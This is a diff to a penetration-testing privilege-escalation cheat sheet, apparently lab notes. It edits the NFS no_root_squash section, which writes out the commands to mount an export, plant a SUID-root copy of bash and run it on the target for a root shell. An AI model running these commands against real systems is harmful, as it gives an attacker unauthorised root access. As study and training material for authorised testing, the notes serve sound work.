@@ -72,10 +72,11 @@ Binary or script (SUID/cron/sudo) calls e.g. `service`/`ps`/`cat` without full p
 
 ### NFS no_root_squash (Slonik-adjacent)
 ```bash
-# On YOUR box (as root), mount the export, drop a SUID root binary:
+# kali (as root) — mount the export, drop a SUID-root bash
 mkdir /mnt/x; mount -o rw,vers=3 $IP:/export /mnt/x
 cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash
-# On target: /export/rootbash -p   -> root
+# target
+/export/rootbash -p        # -> root
 ```
 
 ### Writable /etc/passwd or /etc/shadow
